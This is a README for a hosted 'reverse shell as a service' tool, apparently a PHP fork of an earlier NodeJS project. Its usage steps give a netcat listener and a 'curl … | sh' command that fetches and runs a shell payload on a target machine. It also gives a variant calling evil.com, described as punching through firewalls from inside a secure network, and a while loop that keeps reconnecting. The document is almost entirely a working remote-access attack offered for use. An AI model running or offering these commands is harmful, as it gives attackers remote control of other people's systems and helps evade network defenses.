# Reverse Shell as a Service

> https://r.0x7359.com

Easy to remember reverse shell that should work on most Unix-like systems.

Detects available software on the target and runs an appropriate payload.

This is a fork from [lukechilds' version](https://github.com/lukechilds/reverse-shell), which was made in NodeJS.

I made this in PHP and added more payloads. I'll probably add more functions in the future.

## Usage

### 1. Listen for connection

On your machine, open up a port and listen on it. You can do this easily with netcat.

```shell
nc -l 1337
```
### 2. Execute reverse shell on target

On the target machine, pipe the output of https://r.0x7359.com/yourip:port into sh.

```shell
curl https://r.0x7359.com/192.168.0.69:1337 | sh &
```

Go back to your machine, you should now have a shell prompt.

## Demo

![rev](https://user-images.githubusercontent.com/3837916/128927456-74880809-6d84-4455-aec8-16733f90c202.gif)


## Tips

### Hostname

You can use a hostname instead of an IP.

```shell
curl https://r.0x7359.com/localhost:1337 | sh
```

### Remote connections

Because this is a reverse connection it can punch through firewalls and connect to the internet.

You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with:

```shell
curl https://r.0x7359.com/evil.com:1337 | sh
```

### Reconnecting

By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect at each 5 seconds by wrapping it in a while loop with a sleep. This may not work well with the python payload.

```shell
while true; do curl https://r.0x7359.com/yourip:1337 | sh; sleep 5; done
```
